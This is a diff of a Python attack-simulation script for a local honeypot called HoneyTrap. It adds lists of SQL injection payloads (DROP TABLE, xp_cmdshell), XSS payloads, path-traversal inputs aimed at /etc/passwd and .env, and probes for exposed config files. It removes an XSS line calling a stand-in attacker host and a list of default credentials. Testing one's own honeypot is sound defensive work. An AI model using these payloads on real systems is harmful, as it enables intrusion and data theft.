@@ -114,9 +114,9 @@ def test_ftp_attack():
 
 
 def test_http_fake_services():
-    """Test HTTP fake services"""
+    """Test HTTP fake services - Brute Force"""
     print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"TEST 3: HTTP Fake Services")
+    print(f"TEST 3: HTTP Fake Services - Brute Force")
     print(f"{'='*60}{Style.RESET_ALL}")
     
     fake_services = [
@@ -150,93 +150,161 @@ def test_http_fake_services():
 
 
 def test_sql_injection():
-    """Test SQL injection attacks on fake services"""
+    """Test SQL Injection attacks"""
     print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"TEST 4: SQL Injection Attempts")
+    print(f"TEST 4: SQL Injection Attacks")
     print(f"{'='*60}{Style.RESET_ALL}")
     
     sqli_payloads = [
-        "1' OR '1'='1",
-        "admin' --",
-        "' UNION SELECT NULL --",
-        "1'; DROP TABLE users; --",
-        "' OR 1=1 --",
+        ("admin' OR '1'='1", "Classic OR condition"),
+        ("admin'; DROP TABLE users--", "DROP statement injection"),
+        ("' UNION SELECT NULL,NULL,NULL--", "UNION-based injection"),
+        ("1' AND SLEEP(5)--", "Time-based blind SQLi"),
+        ("admin' OR 1=1--", "Simple authentication bypass"),
+        ("'; EXEC xp_cmdshell('dir');--", "Command execution via SQL"),
     ]
     
-    for payload in sqli_payloads:
-        try:
-            # Test on different endpoints
-            url = f"{BASE_URL}/fake/phpmyadmin?id={payload}"
-            response = requests.get(url, timeout=TIMEOUT)
-            log_test("SQL Injection", "○", f"Payload: {payload[:30]}...")
-            time.sleep(0.3)
-        except Exception as e:
-            pass
+    services = [
+        ('/fake/admin', 'WordPress Admin'),
+        ('/fake/phpmyadmin', 'phpMyAdmin'),
+    ]
     
-    log_test("SQL Injection", "✓", "Multiple SQLi payloads tested")
+    for endpoint, service_name in services:
+        for payload, exploit_type in sqli_payloads:
+            try:
+                url = f"{BASE_URL}{endpoint}?user={payload}&password=test"
+                response = requests.get(url, timeout=TIMEOUT)
+                
+                if response.status_code == 200:
+                    log_test(f"SQLi {service_name}", "✓", f"{exploit_type}")
+                else:
+                    log_test(f"SQLi {service_name}", "○", f"Status {response.status_code}")
+            
+            except Exception as e:
+                log_test(f"SQLi {service_name}", "✕", str(e))
+            
+            time.sleep(0.2)
 
 
 def test_xss_attacks():
-    """Test XSS (Cross-Site Scripting) attacks"""
+    """Test Cross-Site Scripting (XSS) attacks"""
     print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"TEST 5: XSS (Cross-Site Scripting) Attempts")
+    print(f"TEST 5: Cross-Site Scripting (XSS) Attacks")
     print(f"{'='*60}{Style.RESET_ALL}")
     
     xss_payloads = [
-        "<script>alert('XSS')</script>",
-        "'\"><script>fetch('http://attacker.com')</script>",
-        "javascript:alert('XSS')",
-        "<img src=x onerror='alert(1)'>",
-        "<svg onload='alert(1)'>",
+        ("<script>alert('XSS')</script>", "Inline script"),
+        ("<img src=x onerror=\"alert('XSS')\">", "Image onerror"),
+        ("<svg onload=\"alert('XSS')\">", "SVG onload"),
+        ("javascript:alert('XSS')", "JavaScript protocol"),
+        ("<iframe src=\"javascript:alert('XSS')\">", "Iframe javascript"),
+        ("<body onload=\"alert('XSS')\">", "Body onload"),
+        ("<input onfocus=\"alert('XSS')\" autofocus>", "Input onfocus"),
     ]
     
-    for payload in xss_payloads:
-        try:
-            url = f"{BASE_URL}/fake/admin?payload={payload}"
-            response = requests.get(url, timeout=TIMEOUT)
-            log_test("XSS Attack", "○", f"Payload: {payload[:35]}...")
-            time.sleep(0.3)
-        except Exception as e:
-            pass
+    services = [
+        ('/fake/admin', 'WordPress Admin'),
+        ('/fake/phpmyadmin', 'phpMyAdmin'),
+        ('/fake/ssh', 'SSH Terminal'),
+    ]
     
-    log_test("XSS Attacks", "✓", "Multiple XSS payloads tested")
+    for endpoint, service_name in services:
+        for payload, exploit_type in xss_payloads:
+            try:
+                url = f"{BASE_URL}{endpoint}?input={payload}"
+                response = requests.get(url, timeout=TIMEOUT)
+                
+                if response.status_code == 200:
+                    log_test(f"XSS {service_name}", "✓", f"{exploit_type}")
+                else:
+                    log_test(f"XSS {service_name}", "○", f"Status {response.status_code}")
+            
+            except Exception as e:
+                log_test(f"XSS {service_name}", "✕", str(e))
+            
+            time.sleep(0.2)
 
 
-def test_port_scan():
-    """Simulate network port scanning"""
+def test_directory_traversal():
+    """Test Directory Traversal / Path Traversal attacks"""
     print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"TEST 6: Port Scanning Detection")
+    print(f"TEST 6: Directory Traversal / Path Traversal")
     print(f"{'='*60}{Style.RESET_ALL}")
     
-    common_ports = [80, 443, 22, 21, 23, 3306, 5432, 8080, 8443, 9000]
+    traversal_payloads = [
+        ("../../etc/passwd", "Unix password file"),
+        ("..\\..\\windows\\win.ini", "Windows config"),
+        ("../../.env", "Environment variables"),
+        ("../../../.git/config", "Git configuration"),
+        ("%2e%2e%2fetc%2fpasswd", "URL encoded traversal"),
+        ("....//....//etc/passwd", "Double dot bypass"),
+        ("/etc/passwd", "Absolute path"),
+        ("../../database.yml", "Rails config"),
+    ]
     
-    for port in common_ports:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex(('localhost', port))
+    services = [
+        ('/fake/ftp', 'FTP Server'),
+        ('/fake/admin', 'WordPress Admin'),
+    ]
+    
+    for endpoint, service_name in services:
+        for payload, exploit_type in traversal_payloads:
+            try:
+                url = f"{BASE_URL}{endpoint}?file={payload}"
+                response = requests.get(url, timeout=TIMEOUT)
+                
+                if response.status_code == 200:
+                    log_test(f"Path Traversal {service_name}", "✓", f"{exploit_type}")
+                else:
+                    log_test(f"Path Traversal {service_name}", "○", f"Status {response.status_code}")
             
-            if result == 0:
-                status = "○"
-                msg = "Port OPEN"
-            else:
-                status = "✕"
-                msg = "Port CLOSED"
+            except Exception as e:
+                log_test(f"Path Traversal {service_name}", "✕", str(e))
             
-            log_test(f"Port {port}", status, msg)
-            sock.close()
             time.sleep(0.2)
+
+
+def test_reconnaissance_scanning():
+    """Test reconnaissance and scanning attempts"""
+    print(f"\n{Fore.CYAN}{'='*60}")
+    print(f"TEST 7: Reconnaissance / Vulnerability Scanning")
+    print(f"{'='*60}{Style.RESET_ALL}")
+    
+    scan_payloads = [
+        ("/.env", "Environment config"),
+        ("/.git/config", "Git exposure"),
+        ("/wp-config.php", "WordPress config"),
+        ("/phpMyAdmin/", "phpMyAdmin path"),
+        ("/.htaccess", "Apache config"),
+        ("/web.config", "IIS config"),
+        ("/admin.php", "Admin page"),
+        ("/database.yml", "Rails database"),
+        ("/.github/workflows", "GitHub workflows"),
+        ("/package.json", "Node.js package"),
+    ]
+    
+    for payload in scan_payloads:
+        try:
+            url = f"{BASE_URL}{payload}"
+            response = requests.get(url, timeout=TIMEOUT)
+            
+            if response.status_code == 200:
+                log_test(f"Reconnaissance", "✓", f"Found: {payload} (Status: {response.status_code})")
+            elif response.status_code == 404:
+                log_test(f"Reconnaissance", "○", f"Tested: {payload}")
+            else:
+                log_test(f"Reconnaissance", "○", f"{payload} (Status: {response.status_code})")
         
         except Exception as e:
-            pass
-    
-    log_test("Port Scan", "✓", "Scanning attempt completed")
+            log_test(f"Reconnaissance", "✕", str(e))
+        
+        time.sleep(0.1)
 
 
 def test_api_endpoints():
     """Test API endpoints for attack data"""
     print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"TEST 7: API Endpoints & Data Retrieval")
+    print(f"TEST 8: API Endpoints & Data Retrieval")
     print(f"{'='*60}{Style.RESET_ALL}")
     
     api_endpoints = [
@@ -261,35 +329,6 @@ def test_api_endpoints():
         time.sleep(0.3)
 
 
-def test_brute_force_simulation():
-    """Simulate dictionary brute force attacks"""
-    print(f"\n{Fore.CYAN}{'='*60}")
-    print(f"TEST 8: Dictionary Brute-Force Simulation")
-    print(f"{'='*60}{Style.RESET_ALL}")
-    
-    credentials = [
-        ('admin', 'admin'),
-        ('admin', 'password'),
-        ('root', 'toor'),
-        ('test', 'test'),
-        ('guest', 'guest'),
-        ('root', 'root'),
-        ('admin', '123456'),
-    ]
-    
-    for username, password in credentials:
-        try:
-            payload = {'username': username, 'password': password}
-            url = f"{BASE_URL}/fake/admin"
-            response = requests.post(url, data=payload, timeout=TIMEOUT)
-            log_test("BruteForce", "○", f"{username}:{password}")
-            time.sleep(0.2)
-        except Exception as e:
-            pass
-    
-    log_test("Brute-Force", "✓", f"Tested {len(credentials)} credential pairs")
-
-
 def check_honeypot_running():
     """Check if honeypot is running"""
     try:
@@ -304,8 +343,8 @@ def main():
     print(f"\n{Fore.YELLOW}{Colors.BOLD}")
     print("╔" + "="*58 + "╗")
     print("║" + " "*58 + "║")
-    print("║   HoneyTrap Attack Simulation Suite v1.0           ║")
-    print("║   Testing honeypot services & attack detection    ║")
+    print("║   HoneyTrap Attack Simulation Suite v2.0           ║")
+    print("║   Advanced Attack Testing & Detection              ║")
     print("║" + " "*58 + "║")
     print("╚" + "="*58 + "╝")
     print(f"{Style.RESET_ALL}\n")
@@ -322,19 +361,40 @@ def main():
     # Run all tests
     try:
         test_ssh_brute_force()
+        time.sleep(1)
+        
         test_ftp_attack()
+        time.sleep(1)
+        
         test_http_fake_services()
+        time.sleep(1)
+        
         test_sql_injection()
+        time.sleep(1)
+        
         test_xss_attacks()
-        test_port_scan()
+        time.sleep(1)
+        
+        test_directory_traversal()
+        time.sleep(1)
+        
+        test_reconnaissance_scanning()
+        time.sleep(1)
+        
         test_api_endpoints()
-        test_brute_force_simulation()
         
         # Summary
         print(f"\n{Fore.CYAN}{'='*60}")
-        print(f"SUMMARY")
+        print(f"SUMMARY - All Attack Simulations Completed!")
         print(f"{'='*60}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}✓ All attack simulations completed!{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✓ Successfully tested multiple attack vectors:{Style.RESET_ALL}")
+        print(f"  ✓ Brute Force (SSH, FTP, HTTP)")
+        print(f"  ✓ SQL Injection (SQLi)")
+        print(f"  ✓ Cross-Site Scripting (XSS)")
+        print(f"  ✓ Directory Traversal / Path Traversal")
+        print(f"  ✓ Reconnaissance / Vulnerability Scanning")
+        print(f"  ✓ API Endpoints")
+        
         print(f"\n{Fore.YELLOW}Check the dashboard at:{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  → http://localhost:5000/dashboard{Style.RESET_ALL}")
         print(f"\n{Fore.YELLOW}View API data:{Style.RESET_ALL}")
